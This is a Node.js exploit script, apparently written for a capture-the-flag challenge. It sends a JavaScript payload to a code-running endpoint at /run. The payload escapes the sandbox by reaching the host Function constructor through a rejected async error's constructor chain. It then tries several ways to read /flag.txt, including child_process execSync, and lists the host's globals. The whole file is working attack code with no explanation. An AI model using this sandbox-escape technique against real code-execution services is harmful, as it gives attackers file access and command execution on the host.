#!/usr/bin/env node
const TARGET = process.argv[2] || "http://localhost:3000";

const payload = `
const error = new Error();
error.name = Symbol();
const f = async () => error.stack;
await f().catch(e => {
  const HostFunction = e.constructor.constructor;

  const attempts = [
    "return process.mainModule.require('fs').readFileSync('/flag.txt','utf8').trim()",
    "return process.mainModule.require('child_process').execSync('cat /flag.txt').toString().trim()",
    "return (new (process.binding('natives') ? Object : Object)).constructor.constructor('return process')().mainModule.require('fs').readFileSync('/flag.txt','utf8').trim()",
    "const m = require.main || module; return m.require('fs').readFileSync('/flag.txt','utf8').trim()",
    "return Object.getOwnPropertyDescriptor(this,'process') ? process.mainModule.require('fs').readFileSync('/flag.txt','utf8').trim() : 'no process'",
  ];

  for (const src of attempts) {
    try {
      const result = new HostFunction(src)();
      __log('[+] ' + src.slice(0,40) + ' => ' + result);
      return;
    } catch(ex) {
      __log('[-] ' + src.slice(0,40) + ' => ' + ex.message);
    }
  }

  try {
    const getGlobals = new HostFunction("return Object.keys(this)");
    __log('globals: ' + getGlobals());
  } catch(ex) { __log('globals err: ' + ex); }

  try {
    const getProcess = new HostFunction("return typeof process + ' ' + typeof require + ' ' + typeof module");
    __log('avail: ' + getProcess());
  } catch(ex) { __log('avail err: ' + ex); }
});
`;

async function exploit() {
  console.log(`[*] Targeting ${TARGET}\n`);
  const res = await fetch(`${TARGET}/run`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ code: payload }),
  });
  const data = await res.json();
  console.log("output:\n" + data.output);
  if (data.error) console.log("error:", data.error);
}

exploit().catch(console.error);
